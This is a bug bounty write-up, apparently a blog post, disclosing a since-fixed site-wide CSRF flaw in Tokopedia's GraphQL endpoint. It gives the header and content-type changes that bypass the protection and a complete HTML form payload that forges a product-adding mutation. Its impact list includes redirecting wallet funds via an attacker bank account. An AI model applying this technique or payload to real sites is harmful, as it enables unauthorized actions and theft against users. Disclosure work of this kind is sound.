---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-07-15_tokopedia-site-wide-csrf-through-graphql-request.md
original_filename: 2019-07-15_tokopedia-site-wide-csrf-through-graphql-request.md
title: '[TOKOPEDIA] Site-wide CSRF through GraphQL request'
category: documents
detected_topics:
- csrf
- command-injection
- path-traversal
- otp
- graphql
- api-security
tags:
- imported
- documents
- csrf
- command-injection
- path-traversal
- otp
- graphql
- api-security
language: en
raw_sha256: 50379c5bc8a13ee643c3c5fd89080e3be87966bc5ece08b389d7e6a57858904f
text_sha256: c19338a1e47a3da5447d51ae76d9d293389dce0271ecdc1123fc537b17fae263
ingested_at: '2026-06-28T07:31:59Z'
sensitivity: unknown
redactions_applied: false
---

# [TOKOPEDIA] Site-wide CSRF through GraphQL request

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-07-15_tokopedia-site-wide-csrf-through-graphql-request.md
- Source Type: markdown
- Detected Topics: csrf, command-injection, path-traversal, otp, graphql, api-security
- Ingested At: 2026-06-28T07:31:59Z
- Redactions Applied: False
- Raw SHA256: `50379c5bc8a13ee643c3c5fd89080e3be87966bc5ece08b389d7e6a57858904f`
- Text SHA256: `c19338a1e47a3da5447d51ae76d9d293389dce0271ecdc1123fc537b17fae263`


## Content

---
title: "[TOKOPEDIA] Site-wide CSRF through GraphQL request"
page_title: "[Tokopedia] Site-Wide CSRF Through Graphql Request"
url: "https://yeraisci.com/tokopedia-site-wide-csrf-through-graphql-request"
final_url: "https://yeraisci.com/tokopedia-site-wide-csrf-through-graphql-request"
authors: ["Rafie Muhammad (@rafiem777)"]
programs: ["Tokopedia"]
bugs: ["CSRF"]
publication_date: "2019-07-15"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5150
---

# [Tokopedia] Site-Wide CSRF Through Graphql Request

UpdatedJuly 15, 2022

•4 min read•[ __View as Markdown](/tokopedia-site-wide-csrf-through-graphql-request.md)

![\[Tokopedia\] Site-Wide CSRF Through Graphql Request](/_next/image?url=https%3A%2F%2Fcdn.hashnode.com%2Fres%2Fhashnode%2Fimage%2Fupload%2Fv1657865301596%2F9tSe5_1Z4.jpg&w=3840&q=75)

[ R](https://hashnode.com/@yeraisci)

[Rafie Muhammad](https://hashnode.com/@yeraisci)

[ __Part of series Wordpress Plugin Vulnerability Research](/series/wordpress-plugin-vuln)

On this page

What is Cross Site Request Forgery ?What is Graph Query Language ?Proof of ConceptAnd it works !ImpactTimeline

## What is Cross Site Request Forgery ?

* * *

Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated. CSRF attacks specifically target state-changing requests, not theft of data, since the attacker has no way to see the response to the forged request.  
  

## What is Graph Query Language ?

* * *

GraphQL is a query language for APIs and a runtime for fulfilling those queries with your existing data. GraphQL provides a complete and understandable description of the data in your API, gives clients the power to ask for exactly what they need and nothing more, makes it easier to evolve APIs over time, and enables powerful developer tools.  
  

## Proof of Concept

* * *

When visiting [https://m.tokopedia.com](https://m.tokopedia.com/), most of the request is using `GraphQL` endpoint in [https://gql.tokopedia.com](https://gql.tokopedia.com/).Here is the example request to add product to wishlist :

![example_request_add_wishlist.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1657865460909/zGEPwtH_J.png)  
  
When looking at the request in burpsuite, i notice something interesting.The request to `GraphQL` endpoint is not using an authentication key or token in the request header.Usually, `GraphQL` is more like `API` style that use authentication key to get data, but Tokopedia seems to implement the request to `GraphQL` endpoint using session and cookie as authentication.  
  
Indeed, before make an actual request to get the data, it will check the authentication to `GraphQL` using this request :

![request_check_auth_graphql.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1657865584822/aoy80fBRm.png)  
  
I'm thinking if we can somehow perform a CSRF attack to the `GraphQL` endpoint.Then i try to modify request data in burpsuite.Several change that i made to the request :

  1. Remove the `Referer`
  2. Set `Origin` to `null`
  3. Set `content-type` to `text/plain`
  4. Append `"="` to the end of body request

Appending `"="` to the end of the body request is to test if we can make a request of `JSON` data using post form in html and using enctype `text/plain`.After modifying the request, test to send the request. (Example image below is request to change profile image)

![example_request_change_picture.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1657865595559/BnOdrrbT3.png)

#### **And it works !**

  
  

We can then craft a simple html to make a CSRF attack (This POC use sample request of uploading a product to the store) : 
  
  
  <html>
  <body>
  <h1>Site Wide CSRF GraphQL : Add Product to Target User</h1>
  <form action="https://gql.tokopedia.com/" method="POST" enctype="text/plain">
  <input type="hidden" name='[{"operationName":"AddProductMutation","variables":{"input":{"product_brand":{"brand_id":0,"name":""},"product_catalog":{"catalog_id":0},"product_category":{"category_id":891},"product_condition":1,"product_description":"Attacker","product_etalase":{"etalase_id":17561860},"product_free_return":false,"product_min_order":1,"product_must_insurance":false,"product_name":"Added by Attacker","product_picture":[{"from_ig":0,"description":"","x":1,"y":1,"file_path":"product-1/2019/2/6/44628626","file_name":"44628626_6070a039-2f84-4d8c-99b8-c3d68083ebf7_980_759.png"}],"product_preorder":{"preorder_process_time":0,"preorder_status":0,"preorder_time_unit":1},"product_price":100,"product_price_currency":1,"product_sku":"","product_status":1,"product_stock":0,"product_video":[],"product_weight":100,"product_weight_unit":1,"product_wholesale":[]}},"query":"mutation AddProductMutation($input: AddProductInputType) {\n  addProduct(input: $input) {\n  header {\n  messages\n  reason\n  __typename\n  }\n  data {\n  product_id\n  product_name\n  product_alias\n  product_condition\n  product_description\n  product_last_update_price\n  product_min_order\n  product_max_order\n  product_must_insurance\n  product_price\n  product_price_currency\n  product_status\n  product_stock\n  product_weight\n  product_weight_unit\n  product_url\n  product_category {\n  category_id\n  __typename\n  }\n  product_etalase {\n  etalase_id\n  etalase_name\n  __typename\n  }\n  product_position {\n  position\n  __typename\n  }\n  product_shop {\n  shop_id\n  shop_name\n  shop_domain\n  shop_url\n  __typename\n  }\n  product_free_return\n  product_sku\n  product_gtin\n  product_name_editable\n  __typename\n  }\n  errors\n  __typename\n  }\n}\n"}]' />
  <input type="submit" value="Click Me !"/>
  </form>
  </body>
  </html>
  

In above crafted html, is to make a CSRF request to add product to the store (by just modifying the `etalase_id` to id that the targeted store own).When a targeted user or store account visit webpage that hosting this crafted html and click the submit button (or we can make this auto submit using javascript), the CSRF request will be fired and a product is added to the targeted store without user consent.  
  

## Impact

* * *

Seeing that request in [https://m.tokopedia.com](https://m.tokopedia.com/) mostly using `GraphQL`, there is several impact from this security issue :

  1. Change user account profile picture
  2. Add, edit and delete product from the store
  3. Add, edit and delete address from user account
  4. Change profile picture, description, status, slogan of the store
  5. Add, edit and delete send address of the store
  6. Add, edit and delete store note
  7. Stealing tokopedia wallet by adding attacker bank account to targeted user account
  8. Perform anything about `order` action behalf of the user
  9. etc

That's all from my first blog post, see you again in my next blog post (hopefully).  
Happy Bug Hunting !

## Timeline

* * *

Timestamp | Description  
---|---  
February 6th 2019 | Report Submited  
February 6th 2019 | Report is valid and marked as high severity  
March 25th 2019 | Check the vulnerability is fixed and follow up to tokopedia team  
March 25th 2019 | Tokopedia confirm the bug has been fixed  
May 27th 2019 | Reward sent  
July 15th 2019 | Tokopedia Agree to Disclose The Bug  
  
[#bugbounty](/tag/bugbounty)[#security](/tag/security)[#pentesting](/tag/pentesting)[#graphql](/tag/graphql)[#csrf](/tag/csrf)
